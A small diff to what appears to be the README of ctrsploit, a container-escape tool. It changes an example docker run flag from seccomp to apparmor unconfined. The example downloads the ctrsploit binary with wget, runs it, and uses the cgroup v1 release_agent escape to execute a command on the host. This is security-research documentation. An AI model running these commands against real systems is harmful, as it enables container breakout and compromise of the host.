@@ -52,7 +52,7 @@ OPTIONS:
 eg. : escape by 'cgroupv1-release_agent' tech.
 
 ```
-root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
+root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
 root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
 root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
